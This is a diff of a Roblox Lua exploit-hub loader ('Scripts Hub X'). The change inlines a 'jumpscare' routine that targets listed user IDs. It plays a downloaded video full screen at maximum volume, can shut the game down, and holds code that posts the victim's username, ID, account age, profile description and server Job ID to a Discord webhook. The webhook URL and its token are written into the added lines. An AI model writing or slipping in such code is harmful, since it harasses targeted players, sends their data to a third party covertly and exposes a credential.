@@ -15,7 +15,7 @@ local StaffUserId = {
 }
 local BlackUsers = nil
 local JumpscareUsers = {
-    "2341777244"
+    "2341777244" -- Replace with actual UserIDs for JumpscareUsers
 }
 
 local function checkGameSupport()
@@ -95,7 +95,6 @@ local function loadKeySystem()
     end
     
     print("Key system loaded successfully")
-    return BaePart
     return true, KeySystem
 end
 
@@ -149,136 +148,6 @@ local function loadBackgroundMusic()
     end
     print("Background music loaded and playing")
     return sound
-end
-
-local function runJumpscare()
-    if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
-        warn("Already Loading")
-        return
-    end
-
-    pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
-
-    getgenv().Notify = false
-    local Notify_Webhook = "Your Discord Webhook" -- Replace with actual Discord webhook URL if needed
-
-    if not getcustomasset then
-        game:Shutdown() -- Fucked out
-        return
-    end
-
-    local ScreenGui = Instance.new("ScreenGui")
-    local VideoScreen = Instance.new("VideoFrame")
-    ScreenGui.Parent = CoreGui
-    ScreenGui.IgnoreGuiInset = true
-    ScreenGui.Name = "JeffTheKillerWuzHere"
-
-    VideoScreen.Parent = ScreenGui
-    VideoScreen.Size = UDim2.new(1, 0, 1, 0)
-
-    local success, err = pcall(function()
-        writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
-        VideoScreen.Video = getcustomasset("yes.mp4")
-    end)
-    if not success then
-        warn("Failed to load jumpscare video: " .. tostring(err))
-        ScreenGui:Destroy()
-        return
-    end
-
-    VideoScreen.Looped = true
-    VideoScreen.Playing = true
-    VideoScreen.Volume = 10
-
-    local function notify_hook()
-        local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true")
-        local json = HttpService:JSONDecode(ThumbnailAPI)
-        local avatardata = json.data[1].imageUrl
-
-        local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/" .. player.UserId)
-        local json = HttpService:JSONDecode(UserAPI)
-        local DescriptionData = json.description
-        local CreatedData = json.created
-
-        local send_data = {
-            ["username"] = "Jumpscare Notify",
-            ["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
-            ["content"] = "Jeff Wuz Here !",
-            ["embeds"] = {
-                {
-                    ["title"] = "Jeff's Log",
-                    ["description"] = "**Game : https://www.roblox.com/games/" .. game.PlaceId .. "**\n\n**Profile : https://www.roblox.com/users/" .. player.UserId .. "/profile**\n\n**Job ID : " .. game.JobId .. "**",
-                    ["color"] = 4915083,
-                    ["fields"] = {
-                        {
-                            ["name"] = "Username",
-                            ["value"] = player.Name,
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Display Name",
-                            ["value"] = player.DisplayName,
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "User ID",
-                            ["value"] = player.UserId,
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Account Age",
-                            ["value"] = player.AccountAge .. " Day",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Membership",
-                            ["value"] = player.MembershipType.Name,
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Account Created Day",
-                            ["value"] = string.match(CreatedData, "^([%d-]+)"),
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Profile Description",
-                            ["value"] = "```\n" .. DescriptionData .. "\n```",
-                            ["inline"] = true
-                        }
-                    },
-                    ["footer"] = {
-                        ["text"] = "JTK Log",
-                        ["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
-                    },
-                    ["thumbnail"] = {
-                        ["url"] = avatardata
-                    }
-                }
-            },
-        }
-
-        local headers = {
-            ["Content-Type"] = "application/json"
-        }
-
-        request({
-            Url = Notify_Webhook,
-            Method = "POST",
-            Headers = headers,
-            Body = HttpService:JSONEncode(send_data)
-        })
-    end
-
-    if getgenv().Notify == true then
-        if Notify_Webhook == "" then
-            return
-        else
-            pcall(notify_hook)
-        end
-    end
-
-    wait(5)
-    ScreenGui:Destroy()
 end
 
 local function checkPremiumUser()
@@ -390,7 +259,7 @@ coroutine.wrap(function()
         LoadingScreen.setLoadingText("Black User Detected", Color3.fromRGB(0, 0, 0))
         wait(2)
         print("Setting loading text")
-        LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180,outen
+        LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180, 200))
         print("Attempting to animate loading bar")
         local animateBarSuccess = pcall(function()
             LoadingScreen.animateLoadingBar(function()
@@ -430,7 +299,124 @@ coroutine.wrap(function()
         end
     elseif userStatus == "jumpscareuser" then
         print("Jumpscare user detected, running jumpscare script")
-        local success, err = pcall(runJumpscare)
+        local success, err = pcall(function()
+            if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
+                warn("Already Loading")
+                return
+            end
+
+            pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
+
+            getgenv().Notify = false
+            local Notify_Webhook = "https://discord.com/api/webhooks/1390952057296519189/n0SJoYfZq0PD4-vphnZw2d5RTesGZvkLSWm6RX_sBbCZC2QXxVdGQ5q7N338mZ4m9j5E" -- Replace with actual Discord webhook URL if needed
+
+            if not getcustomasset then
+                game:Shutdown()
+                return
+            end
+
+            local ScreenGui = Instance.new("ScreenGui")
+            local VideoScreen = Instance.new("VideoFrame")
+            ScreenGui.Parent = CoreGui
+            ScreenGui.IgnoreGuiInset = true
+            ScreenGui.Name = "JeffTheKillerWuzHere"
+
+            VideoScreen.Parent = ScreenGui
+            VideoScreen.Size = UDim2.new(1, 0, 1, 0)
+
+            writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
+            VideoScreen.Video = getcustomasset("yes.mp4")
+
+            VideoScreen.Looped = true
+            VideoScreen.Playing = true
+            VideoScreen.Volume = 10
+
+            if getgenv().Notify == true then
+                if Notify_Webhook == "" then
+                    return
+                else
+                    local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true")
+                    local json = HttpService:JSONDecode(ThumbnailAPI)
+                    local avatardata = json.data[1].imageUrl
+
+                    local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/" .. player.UserId)
+                    local json = HttpService:JSONDecode(UserAPI)
+                    local DescriptionData = json.description
+                    local CreatedData = json.created
+
+                    local send_data = {
+                        ["username"] = "Jumpscare Notify",
+                        ["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+                        ["content"] = "Jeff Wuz Here !",
+                        ["embeds"] = {
+                            {
+                                ["title"] = "Jeff's Log",
+                                ["description"] = "**Game : https://www.roblox.com/games/" .. game.PlaceId .. "**\n\n**Profile : https://www.roblox.com/users/" .. player.UserId .. "/profile**\n\n**Job ID : " .. game.JobId .. "**",
+                                ["color"] = 4915083,
+                                ["fields"] = {
+                                    {
+                                        ["name"] = "Username",
+                                        ["value"] = player.Name,
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Display Name",
+                                        ["value"] = player.DisplayName,
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "User ID",
+                                        ["value"] = player.UserId,
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Account Age",
+                                        ["value"] = player.AccountAge .. " Day",
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Membership",
+                                        ["value"] = player.MembershipType.Name,
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Account Created Day",
+                                        ["value"] = string.match(CreatedData, "^([%d-]+)"),
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Profile Description",
+                                        ["value"] = "```\n" .. DescriptionData .. "\n```",
+                                        ["inline"] = true
+                                    }
+                                },
+                                ["footer"] = {
+                                    ["text"] = "JTK Log",
+                                    ["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
+                                },
+                                ["thumbnail"] = {
+                                    ["url"] = avatardata
+                                }
+                            }
+                        },
+                    }
+
+                    local headers = {
+                        ["Content-Type"] = "application/json"
+                    }
+
+                    request({
+                        Url = Notify_Webhook,
+                        Method = "POST",
+                        Headers = headers,
+                        Body = HttpService:JSONEncode(send_data)
+                    })
+                end
+            end
+
+            wait(5)
+            ScreenGui:Destroy()
+        end)
         if not success then
             warn("Jumpscare script failed: " .. tostring(err))
             showErrorNotification()
@@ -523,4 +509,70 @@ coroutine.wrap(function()
                 end
             end)
         end)
-        if not an
+        if not animateBarSuccess then
+            warn("Loading bar animation failed, proceeding without animation")
+        end
+    else
+        print("Non-premium user, loading key system")
+        local success, KeySystem = loadKeySystem()
+        if not success then
+            print("Failed to load key system")
+            local success, LoadingScreen = loadLoadingScreen()
+            if success then
+                LoadingScreen.playEntranceAnimations()
+                LoadingScreen.setLoadingText("Failed to load key system", Color3.fromRGB(245, 100, 100))
+                wait(2)
+                LoadingScreen.playExitAnimations()
+            end
+            showErrorNotification()
+            return
+        end
+
+        KeySystem.ShowKeySystem()
+        print("Waiting for key verification")
+        while not KeySystem.IsKeyVerified() do
+            wait(0.1)
+        end
+        print("Key verified")
+        KeySystem.HideKeySystem()
+
+        local success, LoadingScreen = loadLoadingScreen()
+        if not success then
+            print("Failed to load loading screen after key verification")
+            showErrorNotification()
+            return
+        end
+
+        LoadingScreen.playEntranceAnimations()
+        LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180, 200))
+        wait(1)
+        print("Attempting to animate loading bar")
+        local animateBarSuccess = pcall(function()
+            LoadingScreen.animateLoadingBar(function()
+                print("Loading bar completed, triggering exit")
+                local exitSuccess = pcall(function()
+                    LoadingScreen.playExitAnimations()
+                end)
+                if not exitSuccess then
+                    warn("Exit animations failed, forcing GUI destruction")
+                    if screenGui and screenGui.Parent then
+                        screenGui:Destroy()
+                    end
+                end
+                print("Waiting for GUI destruction")
+                repeat wait(0.1) until not screenGui or screenGui.Parent == nil
+                print("Loading Scripts Hub X...")
+                local scriptLoaded = loadGameScript(scriptUrlOrError)
+                if scriptLoaded then
+                    print("Scripts Hub X | Official - Loading Complete!")
+                else
+                    print("Scripts Hub X | Official - Script loading failed!")
+                    showErrorNotification()
+                end
+            end)
+        end)
+        if not animateBarSuccess then
+            warn("Loading bar animation failed, proceeding without animation")
+        end
+    end
+end)()
